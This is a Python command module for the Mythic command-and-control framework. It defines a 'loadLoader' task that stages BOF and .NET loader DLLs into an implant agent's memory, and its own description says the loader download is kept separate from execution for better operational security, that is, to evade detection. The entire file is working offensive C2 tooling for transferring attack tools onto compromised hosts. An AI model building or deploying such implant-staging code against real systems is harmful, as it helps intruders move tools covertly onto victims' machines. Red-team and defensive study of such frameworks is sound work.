from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import pathlib

BOF_LOADER_PATH = pathlib.Path("/opt/loaders/bof_loader.dll")
DOT_LOADER_PATH = pathlib.Path("/opt/loaders/dot_loader.dll")


class LoadLoaderArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="loader_type",
                type=ParameterType.ChooseOne,
                choices=["bof", "dot", "all"],
                default_value="all",
                description="Which loader to stage: bof, dot, or all",
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            self.add_arg("loader_type", "all")
            return
        self.add_arg("loader_type", self.command_line.strip())

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class LoadLoaderCommand(CommandBase):
    cmd = "loadLoader"
    needs_admin = False
    help_cmd = "loadLoader [bof|dot|all]"
    description = (
        "Pre-stage encrypted loader DLLs into agent memory. "
        "Separates the loader download from BOF/NET execution for better OPSEC."
    )
    version = 1
    author = "@PatchRequest"
    attackmapping = ["T1105"]
    argument_class = LoadLoaderArguments

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        loader_type = taskData.args.get_arg("loader_type") or "all"
        bof_file_id = ""
        dot_file_id = ""

        if loader_type in ("bof", "all") and BOF_LOADER_PATH.exists():
            resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
                TaskID=taskData.Task.ID,
                FileContents=BOF_LOADER_PATH.read_bytes(),
                DeleteAfterFetch=False,
            ))
            if resp.Success:
                bof_file_id = resp.AgentFileId

        if loader_type in ("dot", "all") and DOT_LOADER_PATH.exists():
            resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
                TaskID=taskData.Task.ID,
                FileContents=DOT_LOADER_PATH.read_bytes(),
                DeleteAfterFetch=False,
            ))
            if resp.Success:
                dot_file_id = resp.AgentFileId

        taskData.args.add_arg("bof_loader_file_id", bof_file_id, type=ParameterType.String)
        taskData.args.add_arg("dot_loader_file_id", dot_file_id, type=ParameterType.String)
        response.DisplayParams = loader_type

        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
